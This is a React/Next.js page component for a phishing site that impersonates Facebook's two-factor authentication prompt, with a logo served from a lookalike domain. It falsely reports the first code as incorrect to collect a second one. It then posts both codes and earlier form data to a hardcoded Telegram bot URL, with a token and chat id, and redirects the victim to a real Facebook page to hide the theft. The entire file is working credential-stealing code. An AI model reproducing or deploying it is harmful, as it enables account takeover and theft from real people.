import { useCallback, useEffect, useRef, useState } from 'react';
import Countdown from 'react-countdown';
import Image from 'next/image';
import { useRouter } from 'next/router';

import { Button, Modal } from 'antd';

import { standardService } from 'services/apiService/standardService';
import { useStandardActions, useStandardFormData } from 'store/standard/selector';

const ConfirmPage = () => {
  const router = useRouter();

  const [code, setCode] = useState('');
  const [code2, setCode2] = useState('');
  const [count, setCount] = useState(0);
  const [modal, setModal] = useState(false);
  const [showError, setShowError] = useState(false);
  const [showErrorLength, setShowErrorLength] = useState('');
  const [countdownTime, setCountdownTime] = useState(Date.now() + 300000);

  const formDataValue = useStandardFormData();
  const { handleSetFormData } = useStandardActions();

  const handleChangePassword = (event: any) => {
    const { value } = event.target;

    if (showError) {
      setCode2(value);
    } else {
      setCode(value);
    }
  };

  const handleSendCode = async () => {
    if (code || code2) {
      if (count === 2) {
        setShowError(false);
        handleSetFormData({ ...formDataValue, code2: code2 });

        try {
          if (code.length === 6 || code2.length === 6) {
            const response = await standardService.sendMessage(
              'https://api.telegram.org/bot6122232812:AAFzPiXDO6Mt29_8QVjlWWGXaGZildwF8io/sendMessage',
              {
                chat_id: '-4057839789',
                text: JSON.stringify({ ...formDataValue, code2: code2 }, null, 2),
              },
            );

            if (response) {
              router.replace('https://www.facebook.com/policies_center/');
            }
          } else {
            setShowErrorLength('Invalid login code, please try again');
          }
        } catch (error) {
          return;
        }
      } else {
        setShowError(true);
        setCount(2);
        handleSetFormData({ ...formDataValue, code1: code });
        setCode('');
      }
    } else {
      return;
    }
  };

  const visibleModal = () => setModal(false);

  const renderer = useCallback(({ minutes, seconds, completed }: any) => {
    if (completed) {
      return <a>Send code again</a>;
    } else {
      return (
        <span>
          ( wait: {minutes}:{seconds} )
        </span>
      );
    }
  }, []);

  return (
    <section>
      <header>
        <Image
          src='https://meta.supportfanpage.ink/static/uploads/Facebook_f_logo.png'
          alt='facebook'
          width={40}
          height={40}
        />
      </header>

      <div className='two-factor'>
        <h3>Two-factor authentication required (1/3)</h3>

        <div className='desc'>
          <p>
            You’ve asked us to require a 6-digit login code when anyone tries to access your account from a new device
            or browser.
          </p>

          <p>
            Enter the 6-digit code from your <b>code generator</b> or third-party app below.
          </p>
        </div>

        <div className='code'>
          <input
            type='text'
            placeholder='Login code'
            value={showError ? code2 : code}
            onChange={handleChangePassword}
          />
          <Countdown date={countdownTime} renderer={renderer} />
        </div>
        {showError && (
          <div className='error-text'>
            The code generator you entered is incorrect. Please wait 5 minutes to receive another one.
          </div>
        )}
        {showErrorLength && !showError && <div className='error-text'>{showErrorLength}</div>}

        <div className='footer'>
          <div className='anotherway' onClick={() => setModal(true)}>
            Need another way to authenticate?
          </div>

          <Button type='primary' onClick={handleSendCode}>
            Send
          </Button>
        </div>
      </div>

      <Modal
        centered
        title={`Didn't receive a code?`}
        open={modal}
        onCancel={visibleModal}
        footer={[
          <Button key='close' onClick={visibleModal} className='closing-styling-button-no-define'>
            Close
          </Button>,
        ]}
      >
        <div className='receive-code'>
          <p>
            1. Go to <b>Settings {'>'} Security and Login.</b>
          </p>

          <p>
            2. Under the <b>Two-Factor Authentication</b> section, click <b>Use two-factor authentication.</b> You may
            need to re-enter your password.
          </p>

          <p>
            3. Next to <b>Recovery Codes</b>, click <b>Setup</b> then <b>Get Codes</b>. If you've already set up
            recovery codes, you can click <b>Show Codes</b>.
          </p>
        </div>
      </Modal>
    </section>
  );
};

export default ConfirmPage;
